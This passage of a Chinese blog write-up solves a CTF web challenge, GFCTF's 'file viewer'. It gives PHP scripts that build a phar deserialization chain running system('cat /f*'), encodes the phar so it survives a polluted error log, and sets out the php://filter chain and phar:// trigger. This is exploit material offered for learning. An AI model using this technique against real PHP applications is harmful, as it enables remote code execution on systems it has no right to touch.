class="keyword">public</span> <span class="variable">$username</span> = <span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="comment">//$this -&gt; password = [$this,"check"];</span></span><br><span class="line">        <span class="keyword">$this</span> -&gt; username = <span class="keyword">new</span> Myerror();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$a</span> -&gt; password = [<span class="keyword">new</span> User(),<span class="string">"check"</span>];</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里有个坑点就是给<code>password</code>赋值必须在外面赋，而不能在<code>__construct()</code>里面，如果在里面赋值的话最后就打不通，我试了试链子是能通的，但最后写进文件里面再打就不行，这个问题困扰了我很久，而且也问过出题人，感觉就挺离谱的</p>
+<p>链子有了我们就应该考虑下一个问题，就是怎么触发这个反序列化，没有<code>unserialize</code>肯定是无法直接触发的，这里猜测大概率是<code>phar</code>反序列化，但问题就是怎么把<code>phar</code>文件上传上去，这里没有上传页面，肯定是不能直接传的，但我们可以看到<code>Myerror.class.php</code>中写到将错误日志文件写到了<code>/var/www/html/log/error.txt</code>，这里就给我们很明显的提示了，就是把想要的数据写入到错误日志里面，我们先随便写点数据进去看看它是个什么形式：</p>
+<p><img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/VPi346fqsSClhnI.png" alt="image.png"><span class="caption">image.png</span></p>
+<p><img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/a5WEKMOeYP8zcHg.png" alt="image.png"><span class="caption">image.png</span></p>
+<p>可以看到我们想要的数据以及写进去了，但它前前后后全是垃圾数据，我们得想办法把这些垃圾数据清除掉，让它可以被成功解析，这时候我们看到提示里面说的是<code>php://filter</code>中有很多有趣的过滤器，利用这些过滤器编码就可以吃掉这些脏数据，这里就涉及到新知识点了，具体可以参考这篇文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240007">https://www.anquanke.com/post/id/240007</a></p>
+<h2 id="php-filter混合使用吃掉脏数据"><a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/#php-filter%E6%B7%B7%E5%90%88%E4%BD%BF%E7%94%A8%E5%90%83%E6%8E%89%E8%84%8F%E6%95%B0%E6%8D%AE" class="headerlink" title="php://filter混合使用吃掉脏数据"></a>php://filter混合使用吃掉脏数据</h2><p>首先，日志文件中经常会有一些历史的数据，我们首先得先清空文件内容，用到这个过滤器<code>php://filter/read=consumed/resource</code>，后面加上想要清空的文件名就行了，本题为：<code>php://filter/read=consumed/resource=log/error.txt</code></p>
+<p>提到利用过滤器编码，我们首先想到的肯定是<code>php://filter/read=convert.base64-encode/resource</code>，为了避免特殊字符造成的混乱，我们可以在读文件时先将文件内容<code>base64</code>编码一下，而PHP在进行<code>base64</code>解码的时候，不符合<code>base64</code>标准的字符就会被自动忽略，因为<code>base64</code>编码只有可能由<code>a-zA-Z0-9</code>这些字符以及<code>=</code>填充字符组成，那么就只会将这些合法字符组成密文进行解密</p>
+<p>我们通过上面可以看出，日志文件的格式是<code>[x1]phar文件[x2]</code>，<code>[x1]和[x2]</code>都是我们不想要的的脏数据，我们利用单个的<code>base64</code>编码肯定是吃不到他们的，但我们的思路是把除了<code>phar</code>文件以外的其它内容全变成非<code>base64</code>的合法字符，这样的话最后来一次<code>base64</code>解码就都吃掉了</p>
+<p>这时候我们看到那篇文章中写道，我们可以先将需要的数据转换成<code>utf-16le</code>的格式；当它由<code>utf-8</code>转换为<code>utf-16le</code>时，它的每一位字符后面都会加上一个<code>\0</code>，这个<code>\0</code>是不可见字符，但当我们将<code>utf-16le</code>转换为<code>utf-8</code>的时候，只有后面有<code>\0</code>的才会被正常转换，其它的就会被当成乱码，当成乱码就很好呀，前面我们提到了我们就是想要把不需要的内容变成乱码，接下来看看测试：</p>
+<p><img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/htBlkJLzurb9Hp6.png" alt="image.png"><span class="caption">image.png</span></p>
+<p><img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/pAxRiFMUvS6lmLH.png" alt="image.png"><span class="caption">image.png</span></p>
+<p>好耶，成功了，除了我们想要的内容其它内容都变成了乱码，不过在这道题中，由于<code>utf-16le</code>被<code>ban</code>掉了，所以说我们得想个别的来代替，这里可以用<code>ucs-2</code>来代替就行，原理是一样的；这里还有最后一个问题，就是对空字节的处理，它只有一字节，而 <code>file_get_contents()</code> 在加载有空字节的文件时会 <code>warning</code>，所以说我们要对它进行填充编码，这时候我们就能联想到<code>quoted-printable</code>这种编码了，这里面我就直接偷那篇文章里对这种编码的介绍了：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><button class="btn-copy" data-clipboard-snippet=""><i class="ri-file-copy-2-line"></i><span>COPY</span></button><pre><span class="line">quoted-printable</span><br><span class="line">这种编码方法的要点就是对于所有可打印字符的 ascii 码，除特殊字符等号 = 外，都不改变。</span><br><span class="line">= 和不可打印的 ascii 码以及非 ascii 码的数据的编码方法是：</span><br><span class="line">先将每个字节的二进制代码用两个十六进制数字表示，然后在前面再加上一个等号 = 。</span><br><span class="line">举例如 = ，它的编码便是 =3D ，3D 可对照十六进制 ascii 码表得到。</span><br></pre></td></tr></tbody></table></figure>
+
+<p>它也有对应的过滤器：<code>convert.quoted-printable-decode</code>，所以说经过这三次编码之后，就可以出现纯净的<code>phar</code>文件了，所以它解码的顺序为：<code>convert.quoted-printable-decode --&gt; ucs-2 -&gt; utf-8 --&gt; base64-decode</code></p>
+<p>所以说我们的编码顺序是：<code>base64-encode --&gt; utf-8 -&gt; ucs-2 --&gt; convert.quoted-printable-decode</code>，我们可以写一个编码脚本：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><button class="btn-copy" data-clipboard-snippet=""><i class="ri-file-copy-2-line"></i><span>COPY</span></button><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=file_get_contents(<span class="string">'ars2.phar'</span>);</span><br><span class="line"><span class="variable">$payload</span>=iconv(<span class="string">'utf-8'</span>,<span class="string">'UCS-2'</span>,base64_encode(<span class="variable">$b</span>));</span><br><span class="line">file_put_contents(<span class="string">'payload.txt'</span>,quoted_printable_encode(<span class="variable">$payload</span>));</span><br><span class="line"><span class="variable">$s</span> = file_get_contents(<span class="string">'payload.txt'</span>);</span><br><span class="line"><span class="variable">$s</span> = preg_replace(<span class="string">'/=\r\n/'</span>, <span class="string">''</span>, <span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="GC回收机制触发-desctruct"><a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/#GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E8%A7%A6%E5%8F%91-desctruct" class="headerlink" title="GC回收机制触发__desctruct"></a>GC回收机制触发__desctruct</h2><p>这里就是这道题的最后的考点了，因为这里我们要触发<code>phar</code>反序列化，所以说肯定是绕不过<code>phar://</code>的，但注意这里的顺序，是先经过<code>file_get_contents</code>然后再经过<code>filter()</code>，所以说这就是上篇文章讲的那个知识点了，由于异常退出它不能正常进入<code>__desctruct()</code>，所以说我们得利用数组让这个对象失去引用进而触发GC回收机制进入到<code>__desctruct()</code>，这个具体可以看我上一篇文章，这里就直接构造<code>exp</code>了，在上一个<code>exp</code>的基础上进行修改即可：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><button class="btn-copy" data-clipboard-snippet=""><i class="ri-file-copy-2-line"></i><span>COPY</span></button><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Files</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg = <span class="string">'cat /f*'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myerror</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$message</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">$this</span> -&gt; test = <span class="string">'system'</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; message = <span class="keyword">new</span> Files();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="comment">//$this -&gt; password = [$this,"check"];</span></span><br><span class="line">        <span class="keyword">$this</span> -&gt; username = <span class="keyword">new</span> Myerror();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$a</span> -&gt; password = [<span class="keyword">new</span> User(),<span class="string">"check"</span>];</span><br><span class="line"><span class="variable">$b</span>=[<span class="variable">$a</span>,<span class="literal">null</span>];</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">"ars.phar"</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">"test.txt"</span>,<span class="string">"aaaaaaatest"</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>生成<code>phar</code>文件之后，把后面的<code>i:1</code>改成<code>i:0</code>，这里有个坑点就是不能在记事本里面直接改，直接改后面打不出来，也挺离谱的，得放到<code>winhex</code>里面去改十六进制就行</p>
+<p><img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/e4p73WRYbfEic9d.png" alt="image.png"><span class="caption">image.png</span></p>
+<p>改完之后就是去修改签名，由于它也是<code>sha1</code>加密，所以说去跑上次那个修改签名的脚本就行了，直接手动跑出签名填上也行，然后就是去跑那个加密脚本，得到结果：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><button class="btn-copy" data-clipboard-snippet=""><i class="ri-file-copy-2-line"></i><span>COPY</span></button><pre><span class="line">=00R=000=00l=00G=00O=00D=00l=00h=00P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00q=00N=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00B=00X=00A=00Q=00A=00A=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00T=00z=00o=000=00O=00i=00J=00V=00c=002=00V=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00g=006=00I=00n=00V=00z=00Z=00X=00J=00u=00Y=00W=001=00l=00I=00j=00t=00P=00O=00j=00c=006=00I=00k=001=005=00Z=00X=00J=00y=00b=003=00I=00i=00O=00j=00I=006=00e=003=00M=006=00N=00z=00o=00i=00b=00W=00V=00z=00c=002=00F=00n=00Z=00S=00I=007=00T=00z=00o=001=00O=00i=00J=00G=00a=00W=00x=00l=00c=00y=00I=006=00M=00j=00p=007=00c=00z=00o=004=00O=00i=00J=00m=00a=00W=00x=00l=00b=00m=00F=00t=00Z=00S=00I=007=00T=00j=00t=00z=00O=00j=00M=006=00I=00m=00F=00y=00Z=00y=00I=007=00c=00z=00o=003=00O=00i=00J=00j=00Y=00X=00Q=00g=00L=002=00Y=00q=00I=00j=00t=009=00c=00z=00o=000=00O=00i=00J=000=00Z=00X=00N=000=00I=00j=00t=00z=00O=00j=00Y=006=00I=00n=00N=005=00c=003=00R=00l=00b=00S=00I=007=00f=00X=00M=006=00O=00D=00o=00i=00c=00G=00F=00z=00c=003=00d=00v=00c=00m=00Q=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=000=008=006=00N=00D=00o=00i=00V=00X=00N=00l=00c=00i=00I=006=00M=00T=00p=007=00c=00z=00o=004=00O=00i=00J=001=00c=002=00V=00y=00b=00m=00F=00t=00Z=00S=00I=007=00T=00z=00o=003=00O=00i=00J=00N=00e=00W=00V=00y=00c=00m=009=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00c=006=00I=00m=001=00l=00c=003=00N=00h=00Z=002=00U=00i=00O=000=008=006=00N=00T=00o=00i=00R=00m=00l=00s=00Z=00X=00M=00i=00O=00j=00I=006=00e=003=00M=006=00O=00D=00o=00i=00Z=00m=00l=00s=00Z=00W=005=00h=00b=00W=00U=00i=00O=000=004=007=00c=00z=00o=00z=00O=00i=00J=00h=00c=00m=00c=00i=00O=003=00M=006=00N=00z=00o=00i=00Y=002=00F=000=00I=00C=009=00m=00K=00i=00I=007=00f=00X=00M=006=00N=00D=00o=00i=00d=00G=00V=00z=00d=00C=00I=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00a=00T=00o=00x=00O=003=00M=006=00N=00T=00o=00i=00Y=002=00h=00l=00Y=002=00s=00i=00O=003=001=009=00a=00T=00o=00w=00O=000=004=007=00f=00Q=00g=00A=00A=00A=00B=000=00Z=00X=00N=000=00L=00n=00R=004=00d=00A=00s=00A=00A=00A=00C=00L=001=006=00R=00h=00C=00w=00A=00A=00A=00N=00v=00G=00o=00S=00C=002=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00G=00F=00h=00Y=00W=00F=00h=00Y=00W=00F=000=00Z=00X=00N=000=006=00O=00q=00P=00c=004=00H=00F=00K=009=00m=00B=003=00b=00p=00Q=00s=00r=005=00Y=00g=00y=004=00x=00o=00L=00Y=00C=00A=00A=00A=00A=00R=000=00J=00N=00Q=00g=00=3D=00=3D</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="开冲"><a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/#%E5%BC%80%E5%86%B2" class="headerlink" title="开冲"></a>开冲</h2><p>接下来就去打了，这里还有最后一个坑点，我们来讲，为了看出这个坑点，过滤器我们一个一个的用，就不一次直接用三个了：</p>
+<p><img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/QH5qaDEk8AYrFdt.png" alt="image.png"><span class="caption">image.png</span></p>
+<p>首先把payload传上去，然后打第一个过滤器：<code>php://filter/write=convert.quoted-printable-decode/resource=log/error.txt</code></p>
+<p><img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/M3S2chO8IEVaY9k.png" alt="image.png"><span class="caption">image.png</span></p>
+<p>这里看不出有啥问题，接着打第二个：<code>php://filter/write=convert.iconv.ucs-2.utf8/resource=log/error.txt</code></p>
+<p><img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/oM9hWC6dxYjUDZJ.png" alt="image.png"><span class="caption">image.png</span></p>
+<p>打完之后发现这个末尾是有两个<code>=</code>号的，然后我们打第三个：<code>php://filter/write=convert.base64-decode/resource=log/error.txt</code></p>
+<p><img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/E9KxOJMRwmf3qYX.png" alt="image.png"><span class="caption">image.png</span></p>
+<p>好家伙，打完之后发现就只有一个<code>=</code>号了，还有一个奇怪的字符，就离谱，这肯定是打不出来的，至于为啥我也不太清楚，为了补回那个等号，说我们得把<code>payload</code>末尾的<code>=00=3D</code>再写一遍，让这个<code>=</code>正常露出来就行了，改好<code>payload</code>之后先清空日志文件，然后将新的<code>payload</code>传进去，然后直接三个过滤器连在一起用就行了，最后<code>phar://log/error.txt</code>触发即可：</p>
+<p><code>php://filter/read=convert.quoted-printable-decode|convert.iconv.ucs-2.utf-8|convert.base64-decode/resource=log/error.txt</code></p>
+<p><img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/beyIm2cXwLDVQKh.png" alt="image.png"><span class="caption">image.png</span></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/saved_resource" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="http://arsenetang.com/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="http://arsenetang.com/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="http://arsenetang.com/tags/php/" rel="tag">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="http://arsenetang.com/tags/wp/" rel="tag">wp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="http://arsenetang.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="http://arsenetang.com/2022/01/15/Java%E7%AF%87%E4%B9%8BJava%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Java篇之Java动态代理
+          
+        </div>
+      </a>
+    
+    
+      <a href="http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">浅析GC回收机制与phar反序列化</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+    
+    <script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/twikoo.all.min.js.下载"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights ©
+        2021-2022
+        <i class="ri-heart-fill heart_icon"></i> Arsene.Tang
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv">4684</span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv">3724</span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914"></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop" style="opacity: 0;">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="http://arsenetang.com/"><img src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/pika2.jpg" alt="Arsene.Tang"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="http://arsenetang.com/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="http://arsenetang.com/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="http://arsenetang.com/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="http://arsenetang.com/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="http://arsenetang.com/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search" title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="http://arsenetang.com/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/jquery-3.6.0.min.js.下载"></script>
+ 
+<script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/lazyload.min.js.下载"></script>
+
+<!-- Tocbot -->
+ 
+<script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/tocbot.min.js.下载"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/jquery.modal.min.js.下载"></script>
+<link rel="stylesheet" href="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/jquery.modal.min.css">
+<script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/jquery.justifiedGallery.min.js.下载"></script>
+
+<script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/main.js.下载"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/photoswipe.min.css">
+<link rel="stylesheet" href="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/default-skin.min.css">
+<script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/photoswipe.min.js.下载"></script>
+<script src="./WP篇之解析GFCTF---文件查看器 _ Arsene.Tang_files/photoswipe-ui-default.min.js.下载"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
